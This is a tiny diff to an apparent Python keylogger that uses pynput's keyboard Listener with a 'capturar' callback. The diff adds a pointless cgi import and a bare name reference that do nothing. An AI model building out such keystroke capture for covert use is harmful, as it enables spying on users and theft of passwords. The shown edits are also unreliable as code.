@@ -1,3 +1,4 @@
+from cgi import print_arguments
 from pynput.keyboard import Listener
 import re 
 
@@ -15,3 +16,4 @@ def capturar(tecla):
 
 with Listener(on_press=capturar) as l:
     l.join()
+    print_arguments
